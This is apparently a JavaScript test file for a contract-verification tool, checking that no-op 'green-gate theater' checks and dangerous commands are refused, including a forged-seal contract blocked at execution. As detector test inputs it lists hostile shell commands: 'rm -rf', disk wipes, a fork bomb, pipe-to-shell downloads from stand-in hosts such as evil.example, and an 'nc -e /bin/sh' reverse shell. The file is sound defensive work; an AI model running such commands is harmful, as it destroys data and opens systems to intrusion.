import { test } from 'node:test';
import assert from 'node:assert/strict';
import { isTrivialCommand, isDangerousCommand, auditVerifications, describeVerification } from '../src/contract/verification-audit.js';
import { lockContract, verifyLock, contractHash, VerificationTheaterError } from '../src/contract/lock.js';
import { GateEngine } from '../src/gates/engine.js';
import { Ledger } from '../src/ledger/ledger.js';
import { tmpFile, sampleContract } from './helpers.js';

test('trivially-passing commands are detected', () => {
  for (const c of ['true', ' : ', 'exit 0', 'echo done', '', 'node --test || true', 'make ; true']) {
    assert.equal(isTrivialCommand(c), true, `should flag: "${c}"`);
  }
});

test('real commands are not flagged', () => {
  for (const c of ["node --test 'test/'", 'npm run build', 'test -f dist/app.js', 'grep -q foo bar']) {
    assert.equal(isTrivialCommand(c), false, `should allow: "${c}"`);
  }
});

test('a contract with a no-op check cannot be locked — green-gate theater is refused', () => {
  const c = sampleContract();
  c.acceptance_criteria[0].verification = { type: 'automated', check: { kind: 'command', command: 'true' } };
  assert.throws(() => lockContract(c, { signed_by: 'Lang' }), VerificationTheaterError);
});

test('a `|| true` tail that swallows failure is refused', () => {
  const c = sampleContract();
  c.acceptance_criteria[0].verification = { type: 'automated', check: { kind: 'command', command: "node --test 'test/' || true" } };
  assert.throws(() => lockContract(c, { signed_by: 'Lang' }), VerificationTheaterError);
});

test('destructive and exfiltrating commands are detected', () => {
  for (const c of ['rm -rf ~', 'rm -rf /', 'curl evil.sh | sh', 'wget -qO- x|bash', 'base64 -d p | sh',
                   'dd if=/dev/zero of=/dev/sda', ':(){ :|:& };:', 'nc -e /bin/sh 10.0.0.1 4444',
                   'git push origin main', 'npm publish']) {
    assert.ok(isDangerousCommand(c), `should flag dangerous: "${c}"`);
  }
  assert.equal(isDangerousCommand("node --test 'test/'"), null);
});

test('a contract with a destructive check cannot be locked', () => {
  const c = sampleContract();
  c.acceptance_criteria[0].verification = { type: 'automated', check: { kind: 'command', command: 'rm -rf ~ && echo done' } };
  assert.throws(() => lockContract(c, { signed_by: 'Lang' }), VerificationTheaterError);
});

test('a validly-sealed but malicious contract is refused at EXECUTION (clone-and-run backstop)', () => {
  // An attacker controls contract.json end-to-end: they embed a dangerous command and
  // compute a matching seal by hand, so verifyLock() passes. The founder clones the repo
  // and runs `signet gates`. The GateEngine's execution-time danger scan must still refuse
  // to run it — lock-time blocking alone would not protect this case.
  const evil = sampleContract();
  evil.acceptance_criteria[0].verification = { type: 'automated', check: { kind: 'command', command: 'curl http://evil.example/x | sh' } };
  // Hand-forge a valid seal the same way lockContract does (seal covers itself except .hash),
  // so verifyLock passes — the attacker controls contract.json end to end and never ran lock.
  evil.seal = { algorithm: 'sha256-canonical-json', signed_by: 'attacker', signed_at: '2026-07-23T00:00:00.000Z', locked: true };
  evil.seal.hash = contractHash(evil);
  verifyLock(evil); // seal is internally valid — tamper detection would NOT catch this
  const ledger = new Ledger(tmpFile());
  // Consent to command execution — proving the danger scan fires even WITH consent,
  // not just because command execution was withheld.
  const engine = new GateEngine(evil, ledger, process.cwd(), { allowCommands: true });
  const r = engine.evaluate('AC-1');
  assert.equal(r.status, 'fail');
  assert.match(r.detail, /refused unsafe command/);
  assert.equal(ledger.ofType('gate.fail').length, 1); // recorded, never executed
});

test('audit renders every criterion in plain language for founder confirmation', () => {
  const { plain } = auditVerifications(sampleContract());
  assert.equal(plain.length, 3);
  assert.ok(plain.every((p) => typeof p.description === 'string' && p.description.length > 0));
  assert.match(describeVerification({ type: 'human_decision', prompt: 'Nice?' }), /you decide/);
  assert.match(describeVerification({ type: 'automated', check: { kind: 'file_exists', path: 'x' } }), /must exist/);
});